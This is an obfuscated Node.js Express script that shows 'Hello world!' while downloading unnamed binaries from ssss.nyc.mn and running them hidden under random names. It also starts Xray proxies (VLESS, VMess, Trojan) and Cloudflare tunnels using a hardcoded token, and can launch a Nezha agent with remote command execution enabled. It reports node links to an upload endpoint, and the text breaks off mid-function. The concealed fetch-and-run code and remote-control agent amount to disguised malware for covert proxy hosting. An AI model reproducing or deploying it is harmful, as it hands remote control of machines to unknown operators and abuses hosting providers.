const _0xe54b22=_0x3905;function _0x3905(_0x5cc1d6,_0x2a0bf5){const _0x5ccc5d=_0x5ccc();return _0x3905=function(_0x39059d,_0x29e2c0){_0x39059d=_0x39059d-0x19a;let _0x1fa5fe=_0x5ccc5d[_0x39059d];return _0x1fa5fe;},_0x3905(_0x5cc1d6,_0x2a0bf5);}(function(_0x3fe1d8,_0xfea91){const _0x85fc0={_0x3b8e51:0x22e,_0x36167b:0x1ea,_0x3ecd0f:0x19a,_0x3754be:0x21a,_0x47cc8e:0x228},_0x5bb382=_0x3905,_0x1a8961=_0x3fe1d8();while(!![]){try{const _0x152322=-parseInt(_0x5bb382(0x1fc))/0x1+-parseInt(_0x5bb382(_0x85fc0._0x3b8e51))/0x2+parseInt(_0x5bb382(0x20b))/0x3*(parseInt(_0x5bb382(_0x85fc0._0x36167b))/0x4)+-parseInt(_0x5bb382(_0x85fc0._0x3ecd0f))/0x5*(parseInt(_0x5bb382(_0x85fc0._0x3754be))/0x6)+parseInt(_0x5bb382(0x240))/0x7*(parseInt(_0x5bb382(0x1b8))/0x8)+parseInt(_0x5bb382(0x1cd))/0x9+parseInt(_0x5bb382(_0x85fc0._0x47cc8e))/0xa;if(_0x152322===_0xfea91)break;else _0x1a8961['push'](_0x1a8961['shift']());}catch(_0x3e2593){_0x1a8961['push'](_0x1a8961['shift']());}}}(_0x5ccc,0xf2733));const express=require(_0xe54b22(0x1c1)),app=express(),axios=require(_0xe54b22(0x24f)),os=require('os'),fs=require('fs'),path=require(_0xe54b22(0x1c0)),{promisify}=require(_0xe54b22(0x22c)),exec=promisify(require(_0xe54b22(0x25a))['exec']),{execSync}=require(_0xe54b22(0x25a)),UPLOAD_URL=process[_0xe54b22(0x1ff)][_0xe54b22(0x19b)]||'',PROJECT_URL=process[_0xe54b22(0x1ff)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0xe54b22(0x1ff)][_0xe54b22(0x1b0)]||![],FILE_PATH=process[_0xe54b22(0x1ff)][_0xe54b22(0x1d3)]||_0xe54b22(0x255),SUB_PATH=process[_0xe54b22(0x1ff)][_0xe54b22(0x22f)]||_0xe54b22(0x227),PORT=process['env'][_0xe54b22(0x21b)]||process[_0xe54b22(0x1ff)][_0xe54b22(0x200)]||0xbb8,UUID=process[_0xe54b22(0x1ff)][_0xe54b22(0x248)]||'25e78d55-307a-4eed-b8d0-66e2539eb3ff',NEZHA_SERVER=process[_0xe54b22(0x1ff)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xe54b22(0x1ff)][_0xe54b22(0x23b)]||'',NEZHA_KEY=process[_0xe54b22(0x1ff)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0xe54b22(0x225)]||_0xe54b22(0x256),ARGO_AUTH=process[_0xe54b22(0x1ff)][_0xe54b22(0x1cf)]||_0xe54b22(0x207),ARGO_PORT=process[_0xe54b22(0x1ff)][_0xe54b22(0x20a)]||0x1f41,CFIP=process[_0xe54b22(0x1ff)]['CFIP']||_0xe54b22(0x1e3),CFPORT=process[_0xe54b22(0x1ff)]['CFPORT']||0x1bb,NAME=process[_0xe54b22(0x1ff)][_0xe54b22(0x25e)]||'9527';!fs[_0xe54b22(0x261)](FILE_PATH)?(fs[_0xe54b22(0x214)](FILE_PATH),console[_0xe54b22(0x215)](FILE_PATH+'\x20is\x20created')):console[_0xe54b22(0x215)](FILE_PATH+_0xe54b22(0x1af));function _0x5ccc(){const _0x2dec8e=['ArgoDomain:','127.0.0.1','xtls-rprx-vision','NEZHA\x20variable\x20is\x20empty,skip\x20running','/api/delete-nodes','&fp=firefox&type=ws&host=','split','mkdirSync','log','Content-Type','stream','createWriteStream','8443','6QIshdx','SERVER_PORT','Error\x20in\x20startserver:','arm64','Empowerment\x20success\x20for\x20','?encryption=none&security=tls&sni=','filter','toString','error','\x0a\x20\x20credentials-file:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ARGO_DOMAIN','base64','bbq','10118640FPNyIp','countryCode','App\x20is\x20running','\x0aclient_secret:\x20','util','pipe','3371286JUXRYe','SUB_PATH','&path=%2Fvless-argo%3Fed%3D2560#','tunnel.json','Hello\x20world!','/sub.txt\x20saved\x20successfully','unlinkSync','nohup\x20','basename','win32','post','none','text/plain;\x20charset=utf-8','NEZHA_PORT','set','aarch64','application/json','\x20>/dev/null\x202>&1','7lvEqkc','2083','Error\x20reading\x20boot.log:','match','get','https://amd64.ssss.nyc.mn/web','/dev/null','chmod','UUID','config.json','platform','taskkill\x20/f\x20/im\x20','quic','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','isFile','axios','charAt','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','boot.log','substring','random','./tmp','ser.weixiaobao.eu.org','Download\x20','/vmess-argo?ed=2560','rm\x20-rf\x20','child_process','https://arm64.ssss.nyc.mn/v1','message','TunnelSecret','NAME','join','\x20-c\x20\x22','existsSync','6977405OVJHea','UPLOAD_URL','then','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/bot','\x20is\x20running','unshift','web\x20running\x20error:\x20','\x20-s\x20','Nodes\x20uploaded\x20successfully','Add\x20automatic\x20access\x20task\x20faild:\x20','php\x20running\x20error:\x20','/trojan-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','writeFileSync','Unhandled\x20error\x20in\x20startserver:','test','\x0a\x20\x20\x20\x20','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20already\x20exists','AUTO_ACCESS','true','\x22\x20>\x20/dev/null\x202>&1','close','del\x20/f\x20/q\x20','/config.json\x20>/dev/null\x202>&1\x20&','includes','direct','7601080MLkCjK','npm\x20running\x20error:\x20','country_code','arch','arm','\x20>\x20nul\x202>&1','org','https+local://8.8.8.8/dns-query','path','express','automatic\x20access\x20task\x20added\x20successfully','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http\x20server\x20is\x20running\x20on\x20port:','Unknown','catch','tls','2087','finish','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','response','https://arm64.ssss.nyc.mn/web','8341956IQYZQh','/vmess-argo','ARGO_AUTH','forEach','length','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','FILE_PATH','\x0a\x0avmess://','vmess','https://oooo.serv00.net/add-url','floor','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel.yml','?security=tls&sni=','stringify','\x0avless://','all','trojan','\x20failed:\x20','/tunnel.yml\x20run','statSync','\x0a\x20\x20tunnel:\x20','cmcc.cloudflare.seeck.cn','&path=%2Ftrojan-argo%3Fed%3D2560#','pkill\x20-f\x20\x22[','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','config.yaml','7807608zvlHOy','Empowerment\x20failed\x20for\x20','Error\x20downloading\x20files:','send','data','readFileSync','2096','readdirSync','status','false','/vless-argo','from','Skipping\x20adding\x20automatic\x20access\x20task','http','2053','list.txt','push','tcp','766586OFsOOZ','vless','clear','env','PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','blackhole','block','utf-8','map','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','eyJhIjoiODljYzIxNmIyNDBkMzhlMWE5ZWU0Yzg0YzMyMDBkMmIiLCJ0IjoiYjgzODM4MWQtOTAxMS00YTVjLWFlM2QtNGU5NDljODlhODFiIiwicyI6IlpXWXlNVGsxTlRVdE16STVNaTAwTURRNExUaGhNRE10T1RobE1UVXlNRFZoTVdFMCJ9','firefox','\x20-c\x20','ARGO_PORT','3UibTsa','\x20successfully'];_0x5ccc=function(){return _0x2dec8e;};return _0x5ccc();}function generateRandomName(){const _0x2f9f42={_0x10e8fd:0x254,_0x414b76:0x1d1},_0x2f8d42=_0xe54b22,_0x5122e5='abcdefghijklmnopqrstuvwxyz';let _0xe346ad='';for(let _0x127bd4=0x0;_0x127bd4<0x6;_0x127bd4++){_0xe346ad+=_0x5122e5['charAt'](Math[_0x2f8d42(0x1d7)](Math[_0x2f8d42(_0x2f9f42._0x10e8fd)]()*_0x5122e5[_0x2f8d42(_0x2f9f42._0x414b76)]));}return _0xe346ad;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xe54b22(0x25f)](FILE_PATH,npmName),phpPath=path[_0xe54b22(0x25f)](FILE_PATH,phpName),webPath=path[_0xe54b22(0x25f)](FILE_PATH,webName),botPath=path[_0xe54b22(0x25f)](FILE_PATH,botName),subPath=path[_0xe54b22(0x25f)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0xe54b22(0x1f9)),bootLogPath=path[_0xe54b22(0x25f)](FILE_PATH,'boot.log'),configPath=path[_0xe54b22(0x25f)](FILE_PATH,'config.json');function deleteNodes(){const _0x22f999={_0x494998:0x204,_0x84ecc5:0x226,_0x5daa55:0x1d1,_0x231169:0x238,_0x32197d:0x211,_0x36863b:0x1db},_0x282357=_0xe54b22;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x4b55c6;try{_0x4b55c6=fs[_0x282357(0x1ef)](subPath,_0x282357(_0x22f999._0x494998));}catch{return null;}const _0x1e3770=Buffer[_0x282357(0x1f5)](_0x4b55c6,_0x282357(_0x22f999._0x84ecc5))[_0x282357(0x221)]('utf-8'),_0x1a7c93=_0x1e3770[_0x282357(0x213)]('\x0a')[_0x282357(0x220)](_0x1a26d1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x282357(0x1ab)](_0x1a26d1));if(_0x1a7c93[_0x282357(_0x22f999._0x5daa55)]===0x0)return;return axios[_0x282357(_0x22f999._0x231169)](UPLOAD_URL+_0x282357(_0x22f999._0x32197d),JSON[_0x282357(_0x22f999._0x36863b)]({'nodes':_0x1a7c93}),{'headers':{'Content-Type':_0x282357(0x23e)}})['catch'](_0x538d10=>{return null;}),null;}catch(_0x596d74){return null;}}function cleanupOldFiles(){const _0x2c8f8d={_0x175150:0x25f,_0x43a01a:0x24e},_0x50518c=_0xe54b22;try{const _0x238e55=fs[_0x50518c(0x1f1)](FILE_PATH);_0x238e55[_0x50518c(0x1d0)](_0x1fd1b6=>{const _0x566a09=_0x50518c,_0x1b30c9=path[_0x566a09(_0x2c8f8d._0x175150)](FILE_PATH,_0x1fd1b6);try{const _0x422a72=fs[_0x566a09(0x1e1)](_0x1b30c9);_0x422a72[_0x566a09(_0x2c8f8d._0x43a01a)]()&&fs[_0x566a09(0x234)](_0x1b30c9);}catch(_0x195030){}});}catch(_0x82cd89){}}app[_0xe54b22(0x244)]('/',function(_0x7ae814,_0x1c64f1){const _0x3e20a2={_0xfe1f2f:0x1ed,_0x1c5a7d:0x232},_0x1f4132=_0xe54b22;_0x1c64f1[_0x1f4132(_0x3e20a2._0xfe1f2f)](_0x1f4132(_0x3e20a2._0x1c5a7d));});async function generateConfig(){const _0x23ed9e={_0x20b1f5:0x246,_0x3003df:0x239,_0x1e6989:0x1fd,_0x1c897e:0x239,_0x6fb796:0x1ce,_0x1ec317:0x1a7,_0x16cd2e:0x20e,_0x34aac5:0x239,_0x115d18:0x1fb,_0x3635a0:0x239,_0x3f703c:0x1f7,_0x4bc368:0x24c,_0x5408c7:0x1d5,_0x2eb7df:0x1c7,_0x4c0067:0x1bf,_0x323b7d:0x202,_0xbc20bb:0x203,_0x52b8cb:0x25f,_0x3b98bc:0x1db},_0x549511=_0xe54b22,_0x31847d={'log':{'access':_0x549511(_0x23ed9e._0x20b1f5),'error':_0x549511(0x246),'loglevel':_0x549511(_0x23ed9e._0x3003df)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x549511(_0x23ed9e._0x1e6989),'settings':{'clients':[{'id':UUID,'flow':_0x549511(0x20f)}],'decryption':_0x549511(_0x23ed9e._0x1c897e),'fallbacks':[{'dest':0xbb9},{'path':_0x549511(0x1f4),'dest':0xbba},{'path':_0x549511(_0x23ed9e._0x6fb796),'dest':0xbbb},{'path':_0x549511(_0x23ed9e._0x1ec317),'dest':0xbbc}]},'streamSettings':{'network':_0x549511(0x1fb)}},{'port':0xbb9,'listen':_0x549511(_0x23ed9e._0x16cd2e),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x549511(_0x23ed9e._0x34aac5)},'streamSettings':{'network':_0x549511(_0x23ed9e._0x115d18),'security':'none'}},{'port':0xbba,'listen':_0x549511(0x20e),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x549511(_0x23ed9e._0x3635a0)},'streamSettings':{'network':'ws','security':_0x549511(0x239),'wsSettings':{'path':_0x549511(0x1f4)}},'sniffing':{'enabled':!![],'destOverride':[_0x549511(_0x23ed9e._0x3f703c),_0x549511(0x1c7),_0x549511(_0x23ed9e._0x4bc368)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x549511(_0x23ed9e._0x5408c7),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x549511(0x1ce)}},'sniffing':{'enabled':!![],'destOverride':[_0x549511(0x1f7),_0x549511(_0x23ed9e._0x2eb7df),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x549511(0x1de),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x549511(0x1a7)}},'sniffing':{'enabled':!![],'destOverride':[_0x549511(0x1f7),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x549511(_0x23ed9e._0x4c0067)]},'outbounds':[{'protocol':'freedom','tag':_0x549511(0x1b7)},{'protocol':_0x549511(_0x23ed9e._0x323b7d),'tag':_0x549511(_0x23ed9e._0xbc20bb)}]};fs[_0x549511(0x1a9)](path[_0x549511(_0x23ed9e._0x52b8cb)](FILE_PATH,_0x549511(0x249)),JSON[_0x549511(_0x23ed9e._0x3b98bc)](_0x31847d,null,0x2));}function getSystemArchitecture(){const _0xd396ad={_0x13b2e2:0x1bb,_0x51c1a0:0x1bc,_0x557c9b:0x23d},_0x2b52c2=_0xe54b22,_0x2ee21a=os[_0x2b52c2(_0xd396ad._0x13b2e2)]();return _0x2ee21a===_0x2b52c2(_0xd396ad._0x51c1a0)||_0x2ee21a===_0x2b52c2(0x21d)||_0x2ee21a===_0x2b52c2(_0xd396ad._0x557c9b)?'arm':'amd';}function downloadFile(_0x10c0ac,_0x2be69c,_0x49cd2c){const _0x4d6b58={_0x3cb690:0x261,_0x5d0ac7:0x214,_0x138a9f:0x218,_0x4db32d:0x217,_0x25bf7f:0x1c6},_0x5eaf6a={_0x39745a:0x257,_0x39edcd:0x25c},_0x165585={_0x22170d:0x22d},_0xc14a41={_0x54fb96:0x1b3,_0x1ec500:0x236},_0x364a0f=_0xe54b22,_0x5a45ea=_0x10c0ac;!fs[_0x364a0f(_0x4d6b58._0x3cb690)](FILE_PATH)&&fs[_0x364a0f(_0x4d6b58._0x5d0ac7)](FILE_PATH,{'recursive':!![]});const _0x2ff085=fs[_0x364a0f(_0x4d6b58._0x138a9f)](_0x5a45ea);axios({'method':'get','url':_0x2be69c,'responseType':_0x364a0f(_0x4d6b58._0x4db32d)})[_0x364a0f(0x19c)](_0x31ad16=>{const _0x541a98={_0x1034ec:0x257,_0x23b675:0x25c,_0x44c673:0x222},_0x15575e=_0x364a0f;_0x31ad16[_0x15575e(0x1ee)][_0x15575e(_0x165585._0x22170d)](_0x2ff085),_0x2ff085['on'](_0x15575e(0x1c9),()=>{const _0x58a4c5=_0x15575e;_0x2ff085[_0x58a4c5(_0xc14a41._0x54fb96)](),console['log']('Download\x20'+path[_0x58a4c5(_0xc14a41._0x1ec500)](_0x5a45ea)+_0x58a4c5(0x20c)),_0x49cd2c(null,_0x5a45ea);}),_0x2ff085['on'](_0x15575e(0x222),_0x45ee3c=>{const _0x5d1729=_0x15575e;fs['unlink'](_0x5a45ea,()=>{});const _0x3a6754=_0x5d1729(_0x541a98._0x1034ec)+path['basename'](_0x5a45ea)+_0x5d1729(0x1df)+_0x45ee3c[_0x5d1729(_0x541a98._0x23b675)];console[_0x5d1729(_0x541a98._0x44c673)](_0x3a6754),_0x49cd2c(_0x3a6754);});})[_0x364a0f(_0x4d6b58._0x25bf7f)](_0x3f0dcc=>{const _0x90f23d=_0x364a0f,_0x216143=_0x90f23d(_0x5eaf6a._0x39745a)+path['basename'](_0x5a45ea)+_0x90f23d(0x1df)+_0x3f0dcc[_0x90f23d(_0x5eaf6a._0x39edcd)];console[_0x90f23d(0x222)](_0x216143),_0x49cd2c(_0x216143);});}async function downloadFilesAndRun(){const _0x5d99ab={_0x571574:0x1d1,_0x47afe4:0x201,_0x339c8d:0x1c8,_0x133e52:0x241,_0x32d12a:0x1f8,_0x318862:0x1f3,_0x55df22:0x224,_0x2298a2:0x1a9,_0x16073c:0x24d,_0x4204cc:0x215,_0x1c9bbe:0x1a6,_0x394459:0x219,_0x37ef1c:0x1f0,_0x13478a:0x241,_0x3b07be:0x235,_0x7e83d9:0x1e6,_0x4ef874:0x215,_0x406601:0x222,_0x4781ae:0x1a2,_0x43e461:0x1a8,_0x156ef1:0x1d8,_0x50bc21:0x235,_0x440070:0x1a0},_0x348b87={_0x5bb0b9:0x1d0},_0x371be7=_0xe54b22,_0x5449bb=getSystemArchitecture(),_0x117fc7=getFilesForArchitecture(_0x5449bb);if(_0x117fc7[_0x371be7(_0x5d99ab._0x571574)]===0x0){console[_0x371be7(0x215)](_0x371be7(_0x5d99ab._0x47afe4));return;}const _0x3eaf08=_0x117fc7[_0x371be7(0x205)](_0x383ee7=>{return new Promise((_0x59b6ff,_0x23510e)=>{downloadFile(_0x383ee7['fileName'],_0x383ee7['fileUrl'],(_0x5929c9,_0x3beabf)=>{_0x5929c9?_0x23510e(_0x5929c9):_0x59b6ff(_0x3beabf);});});});try{await Promise[_0x371be7(0x1dd)](_0x3eaf08);}catch(_0x3d97ee){console['error'](_0x371be7(0x1ec),_0x3d97ee);return;}function _0x7c949(_0x1ec16f){const _0x494e1e={_0x33b987:0x261},_0x568eb6=_0x371be7,_0x21ab19=0x1fd;_0x1ec16f[_0x568eb6(_0x348b87._0x5bb0b9)](_0x513277=>{const _0x156b79={_0x99ab60:0x222,_0x24b247:0x215},_0x3e9d2e=_0x568eb6;fs[_0x3e9d2e(_0x494e1e._0x33b987)](_0x513277)&&fs[_0x3e9d2e(0x247)](_0x513277,_0x21ab19,_0x15056a=>{const _0x4742cb=_0x3e9d2e;_0x15056a?console[_0x4742cb(_0x156b79._0x99ab60)](_0x4742cb(0x1eb)+_0x513277+':\x20'+_0x15056a):console[_0x4742cb(_0x156b79._0x24b247)](_0x4742cb(0x21e)+_0x513277+':\x20'+_0x21ab19[_0x4742cb(0x221)](0x8));});});}const _0x47080f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x7c949(_0x47080f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x552a2f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x54ba4d=new Set(['443',_0x371be7(0x219),_0x371be7(0x1f0),_0x371be7(_0x5d99ab._0x339c8d),_0x371be7(_0x5d99ab._0x133e52),_0x371be7(_0x5d99ab._0x32d12a)]),_0xce529e=_0x54ba4d['has'](_0x552a2f)?_0x371be7(0x1b1):_0x371be7(_0x5d99ab._0x318862),_0x45c7e5=_0x371be7(0x22b)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x371be7(0x251)+_0xce529e+_0x371be7(_0x5d99ab._0x55df22)+UUID;fs[_0x371be7(_0x5d99ab._0x2298a2)](path['join'](FILE_PATH,_0x371be7(0x1e9)),_0x45c7e5);const _0x1445bd=_0x371be7(0x235)+phpPath+_0x371be7(0x260)+FILE_PATH+_0x371be7(_0x5d99ab._0x16073c);try{await exec(_0x1445bd),console[_0x371be7(_0x5d99ab._0x4204cc)](phpName+_0x371be7(0x1a0)),await new Promise(_0x2d9225=>setTimeout(_0x2d9225,0x3e8));}catch(_0xa64d97){console[_0x371be7(0x222)](_0x371be7(_0x5d99ab._0x1c9bbe)+_0xa64d97);}}else{let _0x1f0e87='';const _0x15da94=['443',_0x371be7(_0x5d99ab._0x394459),_0x371be7(_0x5d99ab._0x37ef1c),'2087',_0x371be7(_0x5d99ab._0x13478a),_0x371be7(0x1f8)];_0x15da94[_0x371be7(0x1b6)](NEZHA_PORT)&&(_0x1f0e87='--tls');const _0x3e0705=_0x371be7(_0x5d99ab._0x3b07be)+npmPath+_0x371be7(0x1a3)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1f0e87+_0x371be7(_0x5d99ab._0x7e83d9);try{await exec(_0x3e0705),console[_0x371be7(_0x5d99ab._0x4ef874)](npmName+_0x371be7(0x1a0)),await new Promise(_0x1c7162=>setTimeout(_0x1c7162,0x3e8));}catch(_0x277af4){console[_0x371be7(0x222)](_0x371be7(0x1b9)+_0x277af4);}}}else console[_0x371be7(0x215)](_0x371be7(0x210));const _0x360a18=_0x371be7(0x235)+webPath+_0x371be7(0x209)+FILE_PATH+_0x371be7(0x1b5);try{await exec(_0x360a18),console[_0x371be7(_0x5d99ab._0x4204cc)](webName+_0x371be7(0x1a0)),await new Promise(_0x47b219=>setTimeout(_0x47b219,0x3e8));}catch(_0x3a796e){console[_0x371be7(_0x5d99ab._0x406601)](_0x371be7(_0x5d99ab._0x4781ae)+_0x3a796e);}if(fs['existsSync'](botPath)){let _0x1119c3;if(ARGO_AUTH[_0x371be7(0x243)](/^[A-Z0-9a-z=]{120,250}$/))_0x1119c3='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x371be7(0x243)](/TunnelSecret/)?_0x1119c3='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x371be7(0x1e0):_0x1119c3=_0x371be7(_0x5d99ab._0x43e461)+FILE_PATH+_0x371be7(_0x5d99ab._0x156ef1)+ARGO_PORT;try{await exec(_0x371be7(_0x5d99ab._0x50bc21)+botPath+'\x20'+_0x1119c3+_0x371be7(0x1ad)),console[_0x371be7(_0x5d99ab._0x4204cc)](botName+_0x371be7(_0x5d99ab._0x440070)),await new Promise(_0x447ecb=>setTimeout(_0x447ecb,0x7d0));}catch(_0x1b4080){console[_0x371be7(0x222)]('Error\x20executing\x20command:\x20'+_0x1b4080);}}await new Promise(_0x24541a=>setTimeout(_0x24541a,0x1388));}function getFilesForArchitecture(_0x18cb4a){const _0x2c90a0={_0x292409:0x1cc,_0x41d44f:0x19e,_0xa0e60b:0x1bc,_0x428a5e:0x1e7,_0x29b527:0x1bc},_0x575410=_0xe54b22;let _0x6e6f90;_0x18cb4a===_0x575410(0x1bc)?_0x6e6f90=[{'fileName':webPath,'fileUrl':_0x575410(_0x2c90a0._0x292409)},{'fileName':botPath,'fileUrl':_0x575410(_0x2c90a0._0x41d44f)}]:_0x6e6f90=[{'fileName':webPath,'fileUrl':_0x575410(0x245)},{'fileName':botPath,'fileUrl':_0x575410(0x19f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x185ef5=_0x18cb4a===_0x575410(_0x2c90a0._0xa0e60b)?_0x575410(_0x2c90a0._0x428a5e):_0x575410(0x19d);_0x6e6f90[_0x575410(0x1a1)]({'fileName':npmPath,'fileUrl':_0x185ef5});}else{const _0x173ddf=_0x18cb4a===_0x575410(_0x2c90a0._0x29b527)?_0x575410(0x25b):'https://amd64.ssss.nyc.mn/v1';_0x6e6f90['unshift']({'fileName':phpPath,'fileUrl':_0x173ddf});}}return _0x6e6f90;}function argoType(){const _0x2b9895={_0x51f37d:0x1e8,_0x2c0c85:0x1a9,_0x451e6f:0x25f,_0xe6efc3:0x215},_0x4e8026=_0xe54b22;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4e8026(0x215)](_0x4e8026(0x1ae));return;}if(ARGO_AUTH['includes'](_0x4e8026(0x25d))){fs['writeFileSync'](path[_0x4e8026(0x25f)](FILE_PATH,_0x4e8026(0x231)),ARGO_AUTH);const _0x5c5aeb=_0x4e8026(0x1e2)+ARGO_AUTH[_0x4e8026(0x213)]('\x22')[0xb]+_0x4e8026(0x223)+path['join'](FILE_PATH,_0x4e8026(0x231))+_0x4e8026(_0x2b9895._0x51f37d)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x4e8026(0x1ca);fs[_0x4e8026(_0x2b9895._0x2c0c85)](path[_0x4e8026(_0x2b9895._0x451e6f)](FILE_PATH,_0x4e8026(0x1d9)),_0x5c5aeb);}else console[_0x4e8026(_0x2b9895._0xe6efc3)](_0x4e8026(0x206));}async function extractDomains(){const _0x2d2ce6={_0x19711b:0x204,_0x25e6bf:0x1d0,_0x3d40a6:0x1d1,_0x591235:0x1c3,_0x2a9ecc:0x234,_0x125344:0x25f,_0x5a94ba:0x1d8,_0x39827a:0x1ad,_0xdf2cdc:0x215,_0x5782fb:0x222},_0x5bf819={_0x5adef8:0x244,_0x3d1248:0x1ee,_0x300a38:0x1ee,_0x491ef4:0x1ba,_0x1a9ba9:0x229,_0x3cd230:0x1ee,_0xe349e6:0x1ee,_0x52a802:0x1be,_0x35d549:0x1c5},_0x50f7b9={_0x5386c6:0x1e5},_0x409282=_0xe54b22;let _0x1c67d9;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1c67d9=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x1c67d9),await _0x42577b(_0x1c67d9);else try{const _0x116f9a=fs[_0x409282(0x1ef)](path[_0x409282(0x25f)](FILE_PATH,_0x409282(0x252)),_0x409282(_0x2d2ce6._0x19711b)),_0x47c482=_0x116f9a[_0x409282(0x213)]('\x0a'),_0x6a507b=[];_0x47c482[_0x409282(_0x2d2ce6._0x25e6bf)](_0x2665e1=>{const _0x53f434=_0x409282,_0x1bbe2d=_0x2665e1[_0x53f434(0x243)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1bbe2d){const _0x11536a=_0x1bbe2d[0x1];_0x6a507b[_0x53f434(0x1fa)](_0x11536a);}});if(_0x6a507b[_0x409282(_0x2d2ce6._0x3d40a6)]>0x0)_0x1c67d9=_0x6a507b[0x0],console[_0x409282(0x215)](_0x409282(0x20d),_0x1c67d9),await _0x42577b(_0x1c67d9);else{console['log'](_0x409282(_0x2d2ce6._0x591235)),fs[_0x409282(_0x2d2ce6._0x2a9ecc)](path[_0x409282(_0x2d2ce6._0x125344)](FILE_PATH,_0x409282(0x252)));async function _0xa9f04b(){const _0x237a80=_0x409282;try{process[_0x237a80(0x24a)]==='win32'?await exec(_0x237a80(0x24b)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x237a80(_0x50f7b9._0x5386c6)+botName[_0x237a80(0x250)](0x0)+']'+botName[_0x237a80(0x253)](0x1)+_0x237a80(0x1b2));}catch(_0x5b6a75){}}_0xa9f04b(),await new Promise(_0x4207d7=>setTimeout(_0x4207d7,0xbb8));const _0x36f00b=_0x409282(0x1a8)+FILE_PATH+_0x409282(_0x2d2ce6._0x5a94ba)+ARGO_PORT;try{await exec(_0x409282(0x235)+botPath+'\x20'+_0x36f00b+_0x409282(_0x2d2ce6._0x39827a)),console[_0x409282(_0x2d2ce6._0xdf2cdc)](botName+_0x409282(0x1a0)),await new Promise(_0x24426a=>setTimeout(_0x24426a,0xbb8)),await extractDomains();}catch(_0x502bb0){console['error']('Error\x20executing\x20command:\x20'+_0x502bb0);}}}catch(_0x184100){console[_0x409282(_0x2d2ce6._0x5782fb)](_0x409282(0x242),_0x184100);}async function _0x22f27a(){const _0xa9748a=_0x409282;try{const _0x5a2b6a=await axios[_0xa9748a(_0x5bf819._0x5adef8)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x5a2b6a[_0xa9748a(0x1ee)]&&_0x5a2b6a[_0xa9748a(_0x5bf819._0x3d1248)][_0xa9748a(0x1ba)]&&_0x5a2b6a[_0xa9748a(_0x5bf819._0x300a38)]['org'])return _0x5a2b6a[_0xa9748a(_0x5bf819._0x3d1248)][_0xa9748a(_0x5bf819._0x491ef4)]+'_'+_0x5a2b6a[_0xa9748a(_0x5bf819._0x300a38)][_0xa9748a(0x1be)];}catch(_0x16cfd6){try{const _0x3a9412=await 